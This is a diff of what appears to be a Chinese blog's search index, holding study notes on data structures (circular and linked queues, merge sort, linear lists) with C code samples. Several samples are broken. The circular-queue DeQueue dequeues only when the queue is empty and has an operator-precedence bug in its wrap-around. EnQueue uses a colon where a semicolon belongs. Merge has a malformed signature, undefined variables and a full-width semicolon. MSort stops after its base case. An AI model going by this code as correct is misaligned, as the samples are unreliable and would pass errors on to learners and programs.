-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 判断队空</span></span><br><span class="line"><span class="comment">2. 取出队头front指针数据域赋值给*e</span></span><br><span class="line"><span class="comment">3. 队头front后移，若最后一位则转到头部</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">DeQueue</span><span class="params">(SqQueue *Q,QElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;front == Q-&gt;rear)	<span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">    *e = Q-&gt;data[Q-&gt;front];	<span class="comment">//2</span></span><br><span class="line">    Q-&gt;front = Q-&gt;front+<span class="number">1</span>%MAXSIZE;	<span class="comment">//3</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li><h4 id="链队（尾进头出的单链表）"><a href="#链队（尾进头出的单链表）" class="headerlink" title="链队（尾进头出的单链表）"></a>链队（<span style="color: red;">尾进头出</span>的单链表）</h4><ol>
-<li><p>空链队：front、rear 均指向<strong>头结点（含有）</strong></p>
-</li>
-<li><p>链队列结构建立：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">结点结构建立：</span></span><br><span class="line"><span class="comment">    存放数据变量、next指针域</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>	<span class="title">QNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">队列链表结构建立：</span></span><br><span class="line"><span class="comment">    队头、队尾指针定义</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QueuePtr front, rear;</span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>链队（队尾）入队：<span style="color: proplue;">变动尾指针rear</span></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 动态生成新结点s</span></span><br><span class="line"><span class="comment">2. 异常判断：动态生成是否成功，内存溢出</span></span><br><span class="line"><span class="comment">3. 数据e赋值给结点s的数据域</span></span><br><span class="line"><span class="comment">4. 结点s指针域尾NULL，作为队尾</span></span><br><span class="line"><span class="comment">5. （原）尾指针rear指向的结点next指向（新结点）s</span></span><br><span class="line"><span class="comment">6. 尾指针rear指向新结点s</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(LinkQueue *Q,<span class="type">int</span> e)</span></span><br><span class="line">&#123;</span><br><span class="line">    QueuePtr s = (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));	<span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(!s)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(OVERFLOW);	<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    s-&gt;data = e;	<span class="comment">//3</span></span><br><span class="line">    s-&gt;next = <span class="literal">NULL</span>:	<span class="comment">//4</span></span><br><span class="line">    Q-&gt;rear-&gt;next = s;	<span class="comment">//5</span></span><br><span class="line">    Q-&gt;rear = s;	<span class="comment">//6</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>链队（队头）出队：<span style="color: proplue;">变动头指针front</span></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 生成新指针变量p用于存放待删除结点</span></span><br><span class="line"><span class="comment">2. 异常检测：判断队空</span></span><br><span class="line"><span class="comment">3，队头结点（头指针的指针域next指向的结点）暂存到p</span></span><br><span class="line"><span class="comment">4. 取出暂存结点的数据域到*e</span></span><br><span class="line"><span class="comment">5. 此结点的指针域next指向的下一个结点 赋值给 头指针的指针域指向的结点，成为新的队头结点</span></span><br><span class="line"><span class="comment">6. 判断此结点是否为队尾（即原队列只存在一个数据），则将尾指针初始化空队（指向头结点）</span></span><br><span class="line"><span class="comment">7. 释放暂存结点p</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">DeQueue</span><span class="params">(LinkQueue *Q,<span class="type">int</span> *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    QueuePtr p;	<span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear == Q-&gt;front)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;	<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    p = Q-&gt;front-&gt;next;	<span class="comment">//3</span></span><br><span class="line">    *e = p-&gt;data;	<span class="comment">//4</span></span><br><span class="line">    Q-&gt;front-&gt;next = p-&gt;next;	<span class="comment">//5</span></span><br><span class="line">    <span class="keyword">if</span>(Q-&gt;rear == p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q-&gt;rear = Q-&gt;front;	<span class="comment">//6</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>计算机综合</category>
-        <category>408计算机</category>
-      </categories>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>WHAT IS DATA STRUCTURE</title>
     <url>/2021/05/29/whats-Data-Structure/</url>
     <content><![CDATA[<h1 id="基本概念-amp-术语"><a href="#基本概念-amp-术语" class="headerlink" title="基本概念&amp;术语"></a>基本概念&amp;术语</h1><h2 id="1-数据"><a href="#1-数据" class="headerlink" title="1. 数据"></a>1. 数据</h2><p>   （描述客观事物的符号，能被计算机识别并操作的符号集合）</p>
@@ -3379,6 +3379,36 @@
 </li>
 <li><p>抽象数据类型 ADT（微元思想）：一个<span style="color: red;">数学模型</span>及定义在该模型上的一组操作</p>
 </li>
+</ol>
+]]></content>
+      <categories>
+        <category>计算机综合</category>
+        <category>408计算机</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Merge Sort</title>
+    <url>/2021/05/29/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/</url>
+    <content><![CDATA[<h3 id="（2路）归并排序（倒置的二叉树：两两合并排序后再合并）"><a href="#（2路）归并排序（倒置的二叉树：两两合并排序后再合并）" class="headerlink" title="（2路）归并排序（倒置的二叉树：两两合并排序后再合并）"></a>（2路）归并排序<span style="color: green;">（倒置的二叉树：两两合并排序后再合并）</span></h3><ol>
+<li><p>二路归并思路：<strong>n个记录看作n个序列</strong>，两两归并后<strong>得到$\lfloor n&#x2F;2 \rfloor$个长度为2或1的有序子序列</strong>，再次循环归并直到得到<strong>一条长度为n的序列</strong></p>
+</li>
+<li><p>&#x3D;&#x3D;递归&#x3D;&#x3D;思路进行归并排序<span style="color: red;">（先拆分，后归并）</span></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MSort</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR1[] , <span class="type">int</span> s , <span class="type">int</span> t)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> TR2[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(s==t)</span><br><span class="line">    &#123;</span><br><span class="line">        TR1[s]=SR[s];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">子区间SR[i...m](下标用k存放)、子区间SR[m+1...n]（下标用j存放） ===&gt; TR[i....n]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Merge</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,k,i;</span><br><span class="line">    <span class="comment">/*****从小到大归并入TR*****/</span></span><br><span class="line">    <span class="keyword">for</span>(j=m+<span class="number">1</span>,k=i ; i&lt;=m &amp;&amp; j&lt;=n ; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(SR[i] &lt; SR[j])</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k] = SR[i++];	<span class="comment">//左SR间元素并入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            TR[k] = SR[j++];	<span class="comment">//右SR元素并入</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/******左右子序列进行元素判断******/</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;=m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(l=<span class="number">0</span> ; l&lt;=m-i ; l++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k+l] = SR[i+l]；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(l=<span class="number">0</span> ; l&lt;=n-j ; l++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k+l] = SR[j+l];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&#x3D;&#x3D;迭代&#x3D;&#x3D;思路进行归并排序</p>
+<ol>
+<li>相邻元素归并：判断序列为奇偶，奇序列需要对最后一个单元素进行处理</li>
+<li>数组复用：S数组当成T数组，T数组当成S数组</li>
+<li>合并元素数从k &#x3D; 1成倍增加（log<sub>2</sub>n）<span style="color: green;">【1、1x2、2x2、4x2…】</span></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergeSort2</span><span class="params">(SqList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *TR=(<span class="type">int</span>*)<span class="built_in">malloc</span>(L-&gt;length * <span class="keyword">sizeof</span>(<span class="type">int</span>));	<span class="comment">//存放归并结果，动态生成归并数据空间</span></span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k&lt;L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        MergePass(L-&gt;r , TR , k , L-&gt;length);	</span><br><span class="line">        k=<span class="number">2</span>*k;</span><br><span class="line">        MergePass(TR , L-&gt;r , k , L-&gt;length);</span><br><span class="line">        k=<span class="number">2</span>*k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergePass</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR[] , <span class="type">int</span> s , <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="comment">/****调用两两归并(采用相邻两个元素归并的方式)****/</span></span><br><span class="line">    <span class="keyword">while</span>(i &lt;=  n<span class="number">-2</span>*s+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Merge(SR , TR , i ,i+s<span class="number">-1</span> , i+<span class="number">2</span>*s<span class="number">-1</span>);</span><br><span class="line">        i = i+<span class="number">2</span>*s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if(i &lt; n-s+1)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        Merge(SR , TR , i , i+s-1 , n);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/******奇数序列，对最后一个元素进行处理*******/</span></span><br><span class="line">    <span class="keyword">if</span>(i &gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = i ; j &lt;= n ; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[j] = SR[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
 ]]></content>
       <categories>
@@ -3684,36 +3714,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Merge Sort</title>
-    <url>/2021/05/29/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/</url>
-    <content><![CDATA[<h3 id="（2路）归并排序（倒置的二叉树：两两合并排序后再合并）"><a href="#（2路）归并排序（倒置的二叉树：两两合并排序后再合并）" class="headerlink" title="（2路）归并排序（倒置的二叉树：两两合并排序后再合并）"></a>（2路）归并排序<span style="color: green;">（倒置的二叉树：两两合并排序后再合并）</span></h3><ol>
-<li><p>二路归并思路：<strong>n个记录看作n个序列</strong>，两两归并后<strong>得到$\lfloor n&#x2F;2 \rfloor$个长度为2或1的有序子序列</strong>，再次循环归并直到得到<strong>一条长度为n的序列</strong></p>
-</li>
-<li><p>&#x3D;&#x3D;递归&#x3D;&#x3D;思路进行归并排序<span style="color: red;">（先拆分，后归并）</span></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MSort</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR1[] , <span class="type">int</span> s , <span class="type">int</span> t)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> TR2[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(s==t)</span><br><span class="line">    &#123;</span><br><span class="line">        TR1[s]=SR[s];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">子区间SR[i...m](下标用k存放)、子区间SR[m+1...n]（下标用j存放） ===&gt; TR[i....n]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Merge</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,k,i;</span><br><span class="line">    <span class="comment">/*****从小到大归并入TR*****/</span></span><br><span class="line">    <span class="keyword">for</span>(j=m+<span class="number">1</span>,k=i ; i&lt;=m &amp;&amp; j&lt;=n ; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(SR[i] &lt; SR[j])</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k] = SR[i++];	<span class="comment">//左SR间元素并入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            TR[k] = SR[j++];	<span class="comment">//右SR元素并入</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/******左右子序列进行元素判断******/</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;=m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(l=<span class="number">0</span> ; l&lt;=m-i ; l++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k+l] = SR[i+l]；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(l=<span class="number">0</span> ; l&lt;=n-j ; l++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k+l] = SR[j+l];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>&#x3D;&#x3D;迭代&#x3D;&#x3D;思路进行归并排序</p>
-<ol>
-<li>相邻元素归并：判断序列为奇偶，奇序列需要对最后一个单元素进行处理</li>
-<li>数组复用：S数组当成T数组，T数组当成S数组</li>
-<li>合并元素数从k &#x3D; 1成倍增加（log<sub>2</sub>n）<span style="color: green;">【1、1x2、2x2、4x2…】</span></li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergeSort2</span><span class="params">(SqList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *TR=(<span class="type">int</span>*)<span class="built_in">malloc</span>(L-&gt;length * <span class="keyword">sizeof</span>(<span class="type">int</span>));	<span class="comment">//存放归并结果，动态生成归并数据空间</span></span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k&lt;L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        MergePass(L-&gt;r , TR , k , L-&gt;length);	</span><br><span class="line">        k=<span class="number">2</span>*k;</span><br><span class="line">        MergePass(TR , L-&gt;r , k , L-&gt;length);</span><br><span class="line">        k=<span class="number">2</span>*k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergePass</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR[] , <span class="type">int</span> s , <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="comment">/****调用两两归并(采用相邻两个元素归并的方式)****/</span></span><br><span class="line">    <span class="keyword">while</span>(i &lt;=  n<span class="number">-2</span>*s+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Merge(SR , TR , i ,i+s<span class="number">-1</span> , i+<span class="number">2</span>*s<span class="number">-1</span>);</span><br><span class="line">        i = i+<span class="number">2</span>*s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if(i &lt; n-s+1)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        Merge(SR , TR , i , i+s-1 , n);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/******奇数序列，对最后一个元素进行处理*******/</span></span><br><span class="line">    <span class="keyword">if</span>(i &gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = i ; j &lt;= n ; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[j] = SR[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>计算机综合</category>
-        <category>408计算机</category>
-      </categories>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>交换类排序算法：快速排序</title>
     <url>/2021/05/29/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
     <content><![CDATA[<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><ol>
@@ -3879,6 +3879,232 @@
       </categories>
       <tags>
         <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linear Tables</title>
+    <url>/2021/05/29/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[<h1 id="线性表存储结构"><a href="#线性表存储结构" class="headerlink" title="线性表存储结构"></a>线性表存储结构</h1><ol>
+<li><h3 id="线性表（List）的定义：零-x2F-多个数据元素的有限序列"><a href="#线性表（List）的定义：零-x2F-多个数据元素的有限序列" class="headerlink" title="线性表（List）的定义：零&#x2F;多个数据元素的有限序列"></a>线性表（List）的定义：零&#x2F;多个数据元素的<span style="color: red;">有限序列</span></h3><ol>
+<li><h4 id="List主要性质："><a href="#List主要性质：" class="headerlink" title="List主要性质："></a>List主要性质：</h4><ol>
+<li>是一个有限序列</li>
+<li>元素之间是有顺序的</li>
+<li>存在&#x3D;&#x3D;直接前驱元素&#x3D;&#x3D;和&#x3D;&#x3D;直接后继元素&#x3D;&#x3D;</li>
+<li>第一个元素无前驱，最后一个元素无后继</li>
+</ol>
+</li>
+<li><h4 id="线性表长度：元素个数-n"><a href="#线性表长度：元素个数-n" class="headerlink" title="线性表长度：元素个数 n"></a>线性表长度：元素个数 <span style="color: red;">n</span></h4></li>
+<li><h4 id="空表：n-x3D-0"><a href="#空表：n-x3D-0" class="headerlink" title="空表：n&#x3D;0"></a>空表：n&#x3D;0</h4></li>
+<li><h4 id="位序：（ai）中的i"><a href="#位序：（ai）中的i" class="headerlink" title="位序：（ai）中的i"></a>位序：（a<span style="color: red;"><sub>i</sub></span>）中的<span style="color: red;">i</span></h4></li>
+</ol>
+</li>
+<li><h3 id="线性表的抽象数据类型"><a href="#线性表的抽象数据类型" class="headerlink" title="线性表的抽象数据类型"></a>线性表的抽象数据类型</h3><ol>
+<li><h4 id="传参原则：-传递一个参数给函数时，参数会不会在函数内被改动决定了使用什么传参形式"><a href="#传参原则：-传递一个参数给函数时，参数会不会在函数内被改动决定了使用什么传参形式" class="headerlink" title="传参原则：(传递一个参数给函数时，参数会不会在函数内被改动决定了使用什么传参形式)"></a><span style="color: red;">传参原则</span>：(传递一个参数给函数时，参数会不会在函数内被改动决定了使用什么传参形式)</h4><ol>
+<li>如果<strong>需要</strong>被改，&#x3D;&#x3D;传递&#x3D;&#x3D;指向这个参数的&#x3D;&#x3D;指针&#x3D;&#x3D;</li>
+<li>如果<strong>不需要</strong>被改，直接&#x3D;&#x3D;传递&#x3D;&#x3D;这个&#x3D;&#x3D;参数&#x3D;&#x3D;</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADT List</span><br><span class="line">Data</span><br><span class="line">   对象集合为&#123;a1,a2,...,an&#125;</span><br><span class="line">Operation</span><br><span class="line">   InitList(*L)</span><br><span class="line">   ListEmpty(L)</span><br><span class="line">   ClearList(*L)</span><br><span class="line">   GetElem(L,i,*e)</span><br><span class="line">   LocateElem(L,e)</span><br><span class="line">   ListInsert(*L,i,e)</span><br><span class="line">   ListDelete(*L,i,*e)</span><br><span class="line">   ListLength(L)</span><br><span class="line">   endADT</span><br></pre></td></tr></table></figure>
+</li>
+<li><h3 id="线性表的顺序存储结构"><a href="#线性表的顺序存储结构" class="headerlink" title="线性表的顺序存储结构"></a>线性表的<span style="color: purple;">顺序存储结构</span></h3><ol>
+<li><h4 id="定义与性质：用一段-x3D-x3D-地址连续-x3D-x3D-的-x3D-x3D-存储单元-x3D-x3D-依次存储线表的-x3D-x3D-数据元素-x3D-x3D"><a href="#定义与性质：用一段-x3D-x3D-地址连续-x3D-x3D-的-x3D-x3D-存储单元-x3D-x3D-依次存储线表的-x3D-x3D-数据元素-x3D-x3D" class="headerlink" title="定义与性质：用一段&#x3D;&#x3D;地址连续&#x3D;&#x3D;的&#x3D;&#x3D;存储单元&#x3D;&#x3D;依次存储线表的&#x3D;&#x3D;数据元素&#x3D;&#x3D;"></a>定义与性质：用一段&#x3D;&#x3D;地址连续&#x3D;&#x3D;的&#x3D;&#x3D;存储单元&#x3D;&#x3D;<span style="color: red;">依次存储</span>线表的&#x3D;&#x3D;数据元素&#x3D;&#x3D;</h4><ol>
+<li><p>存储方式：顺序占位 O(1)</p>
+</li>
+<li><p>实现方式：一维数组</p>
+<ol>
+<li><p>估算最大存储容量，建立数组</p>
+</li>
+<li><p>（固定）数组长度&#x3D;&#x3D;最大存储容量</p>
+<pre><code><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   ElemType data[MAXSIZE];</span><br><span class="line">   <span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+</li>
+<li><p><span style="color: red;">顺序存储结构三属性</span>：</p>
+<blockquote>
+<p>data：数组data的存储空间初始位置就是存储空间的存储位置</p>
+</blockquote>
+<blockquote>
+<p>MAXSIZE：最大存储容量&#x2F;数组(据)长度</p>
+</blockquote>
+<blockquote>
+<p>int length：当前线性表长度</p>
+</blockquote>
+</li>
+</ol>
+</li>
+<li><h4 id="地址的计算方法：-x3D-x3D-数据元素的序号-x3D-x3D-与存放的数组-x3D-x3D-下标-x3D-x3D-存在-x3D-x3D-对应-x3D-x3D-关系"><a href="#地址的计算方法：-x3D-x3D-数据元素的序号-x3D-x3D-与存放的数组-x3D-x3D-下标-x3D-x3D-存在-x3D-x3D-对应-x3D-x3D-关系" class="headerlink" title="地址的计算方法：&#x3D;&#x3D;数据元素的序号&#x3D;&#x3D;与存放的数组&#x3D;&#x3D;下标&#x3D;&#x3D;存在&#x3D;&#x3D;对应&#x3D;&#x3D;关系"></a>地址的计算方法：&#x3D;&#x3D;数据元素的序号&#x3D;&#x3D;与存放的数组&#x3D;&#x3D;下标&#x3D;&#x3D;存在&#x3D;&#x3D;对应&#x3D;&#x3D;关系</h4></li>
+</ol>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>data[]（下标）</th>
+<th>0</th>
+<th>1</th>
+<th>…</th>
+<th>i-2</th>
+<th>i-1</th>
+<th>…</th>
+<th>n-1</th>
+<th>空闲空间</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>a<span style="color: red;"><sub>?</sub></span></td>
+<td>a<sub>1</sub></td>
+<td>a<sub>2</sub></td>
+<td>…</td>
+<td>a<sub>i-1</sub></td>
+<td>a<sub>i</sub></td>
+<td>…</td>
+<td></td>
+<td>a<sub>n</sub></td>
+</tr>
+</tbody></table>
+<ul>
+<li>C语言：数组地址从 0 开始，对应数据元素序号为 n-1<ol start="3">
+<li><h4 id="顺序存储结构的查找、插入、删除"><a href="#顺序存储结构的查找、插入、删除" class="headerlink" title="顺序存储结构的查找、插入、删除"></a>顺序存储结构的查找、插入、删除</h4></li>
+</ol>
+  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">查找获取线性表L中第i个位置（对应data[i-1]）の元素值</span></span><br><span class="line"><span class="comment">时间复杂度：O(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Status;</span><br><span class="line">Status <span class="title function_">GetElem</span><span class="params">(SqList L,<span class="type">int</span> i,ElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(L.length==<span class="number">0</span> || i&lt;<span class="number">1</span> || i&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    </span><br><span class="line">    &#125;</span><br><span class="line">    *e=L.data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">插入算法思路：</span></span><br><span class="line"><span class="comment">    1.如果插入位置不合理，抛出异常</span></span><br><span class="line"><span class="comment">    2.如果线性表长度大于等于数组长度，抛出异常或动态扩容</span></span><br><span class="line"><span class="comment">    3.最后一个元素**向前遍历**到第i个位置，分别都后移一个位置</span></span><br><span class="line"><span class="comment">    4.插入元素到i处</span></span><br><span class="line"><span class="comment">    5.length+1</span></span><br><span class="line"><span class="comment">关键点：</span></span><br><span class="line"><span class="comment">     a1.第 i 个元素 == data[i-1]</span></span><br><span class="line"><span class="comment">    a2. k 从表倒数第二位循环向前推进覆盖 k+1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListInsert</span><span class="params">(SqList *L,<span class="type">int</span> i,ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length==MAXSIZE)    <span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;L-&gt;length+<span class="number">1</span>)    <span class="comment">//2</span></span><br><span class="line">     